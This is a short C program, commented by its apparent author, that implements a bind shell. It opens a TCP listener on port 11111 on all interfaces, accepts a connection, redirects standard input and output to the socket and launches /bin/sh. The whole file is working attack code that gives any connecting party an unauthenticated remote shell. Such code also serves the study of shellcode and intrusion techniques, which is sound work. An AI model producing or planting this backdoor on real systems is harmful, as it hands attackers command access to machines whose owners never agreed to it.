// A C program that binds a command shell to a listening port, also known a bind shell
// For the server, which means the socket is going to listen
// Author -> Supreem Khadka


#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>


int main(void)
{

	int sockfd, bindr, listenr, new_socket;
	struct sockaddr_in server_address;	
	// creating a socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0)
	{
		printf("Unable to create a Socket !!!!\n");
		return 1;
	}
	
	// binding/ assigning a name to the socket
	server_address.sin_family = AF_INET;
	server_address.sin_port = htons(11111);
	server_address.sin_addr.s_addr =  INADDR_ANY;
	
	bindr = bind(sockfd, (struct sockaddr *)&server_address, sizeof(server_address));
	
	if (bindr == -1)
	{
		printf("Unable to bind !!!!\n");
		return 1;
	}
	

	// put the server in a passive mode, so that it waits for a client to make a connection using listen
	listenr = listen(sockfd, 0);

	if (listenr == -1)
	{
		printf("Unable to put the server in a passive mode !!!!\n");
		return 1;
	}

	// Extract the first connection  request for listening socket, sockfd and create a new connected socket,
	// and return a file descriptor referring to that socket
	new_socket = accept(sockfd, NULL, NULL);

	if (new_socket == -1)
	{
		printf("Unable to respond to the request !!!\n");
		return 1;
	}

	for (int i = 0; i < 3; i++)
	{
		if(dup2(new_socket, i) == -1)
		{
			printf("Duplication failed !!!\n");
			return 1;
		}
	}

	// execve(), so that the client can have a shell
	if (execve("/bin/sh", NULL, NULL) == -1)
	{
		printf("Unable to spawn a shell !!!\n");
		return 1;
	}


	return 0;
}	
